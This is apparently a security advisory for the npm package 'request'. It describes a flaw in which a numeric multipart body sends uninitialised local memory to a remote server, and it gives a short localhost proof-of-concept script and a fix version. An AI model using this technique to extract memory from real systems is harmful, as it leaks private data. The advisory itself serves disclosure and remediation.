summary: "Remote Memory Exposure in request\nAffected versions of `request` will disclose local\
  \ system memory to remote systems in certain circumstances. When a multipart request is made,\
  \ and the type of `body` is `number`, then a buffer of that size will be allocated and sent\
  \ to the remote server as the body.\n\n## Proof of Concept\n\n```js\nvar request = require('request');\n\
  var http = require('http');\n\nvar serveFunction = function (req, res){\n\treq.on('data',\
  \ function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server\
  \ = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\"\
  ,\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n\
  ```\n\n\n## Recommendation\n\nUpdate to version 2.68.0 or later"
